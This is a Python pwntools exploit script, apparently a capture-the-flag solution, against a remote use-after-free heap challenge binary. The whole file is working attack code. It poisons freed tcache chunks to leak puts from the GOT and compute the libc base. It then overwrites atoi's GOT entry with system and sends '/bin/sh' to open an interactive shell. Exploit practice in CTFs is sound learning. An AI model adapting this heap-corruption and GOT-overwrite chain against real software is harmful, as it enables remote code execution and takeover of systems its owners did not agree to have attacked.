from pwn import *
import sys

elf = ELF("uaf_patched")
libc = ELF("libc.so.6")

# io = process(elf.path, env = {"LD_PRELOAD":"./libc.so.6"})
io = remote('host1.metaproblems.com', 5600)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def create(payload):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"here:\n", payload)
    return io.recvline()
    

def view(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"view:\n", idx)
    io.recvuntil(b'Your rule: ')
    r = io.recvline()
    return r

def edit(idx, payload):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"edit:\n", idx)
    io.sendlineafter(b"here:\n", payload)

def delete(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"delete:\n", idx)

# libc leak
create(b'hogehoge')
create(b'hogehoge')
create(b'hogehoge')
create(b'hogehoge')
create(b'hogehoge')
delete(b'2')
delete(b'1')
edit(b'1', p64(elf.sym["rules"]))
r = create(b'hogehoge')
print(r)
r = create(p64(elf.got['puts']))
print(r)
leak = u64(view(b'0')[:-1] + b'\x00\x00')
libc.address = leak - libc.sym['puts']
print(f'libc addr: {hex(libc.address)}')

# exploit

delete(b'4')
delete(b'3')
edit(b'3', p64(elf.got["atoi"]))
create(b'hogehoge')
create(p64(libc.sym['system']))
io.sendline(b'/bin/sh\x00')


io.interactive()
